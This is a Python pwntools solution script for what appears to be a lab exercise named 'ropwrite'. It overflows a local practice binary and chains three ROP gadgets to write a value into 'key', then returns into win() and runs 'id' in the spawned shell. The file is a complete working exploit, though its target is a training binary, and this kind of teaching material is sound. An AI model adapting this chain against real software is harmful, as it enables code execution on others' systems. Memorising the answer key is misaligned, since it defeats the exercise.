#!/usr/bin/env python3
"""Solution for Problem 3 (ropwrite): a ROP write-what-where primitive.

Build `*key = 0x41414141` out of three gadgets chained by their rets, then
return into win():

    A: pop eax ; ret         -> eax = &key
    B: pop ebx ; ret         -> ebx = 0x41414141
    C: mov [eax], ebx ; ret  -> *key = 0x41414141
    stack: [A][&key][B][0x41414141][C][&win]

Gadget addresses are found by searching the binary's bytes, so this works
whether they come from the gadget farm or anywhere else in the code.

Run:  cd example5 && make && python3 solution5/solve_ropwrite.py
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))


def runnable(path):
    """/vagrant vboxsf flakily drops the +x bit; always run from an ext4 copy."""
    import shutil, tempfile
    dst = os.path.join(tempfile.mkdtemp(), os.path.basename(path))
    shutil.copy(path, dst)
    os.chmod(dst, 0o755)
    return dst


BIN = runnable(os.path.join(HERE, "..", "ropwrite"))
elf = ELF(BIN, checksec=False)


def find_offset():
    io = process(BIN)
    io.sendline(cyclic(200))
    io.wait()
    off = cyclic_find(io.corefile.eip)
    io.close()
    log.success("offset = %d", off)
    return off


def g(asm_str):
    """Address of a gadget by its exact byte encoding."""
    return next(elf.search(asm(asm_str)))


def main():
    offset = find_offset()

    pop_eax = g("pop eax; ret")
    pop_ebx = g("pop ebx; ret")
    write_g = g("mov dword ptr [eax], ebx; ret")
    log.info("pop eax @ %#x  pop ebx @ %#x  mov [eax],ebx @ %#x",
             pop_eax, pop_ebx, write_g)

    chain = flat(
        pop_eax, elf.symbols["key"],
        pop_ebx, 0x41414141,
        write_g,
        elf.symbols["win"],
    )
    payload = flat(b"A" * offset, chain)

    io = process(BIN)
    io.recvuntil(b"rop me:\n")
    io.sendline(payload)
    io.recvuntil(b"spawning shell", timeout=3)
    log.success("key written via ROP -> win() -- dropping a shell")
    io.sendline(b"id; echo PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
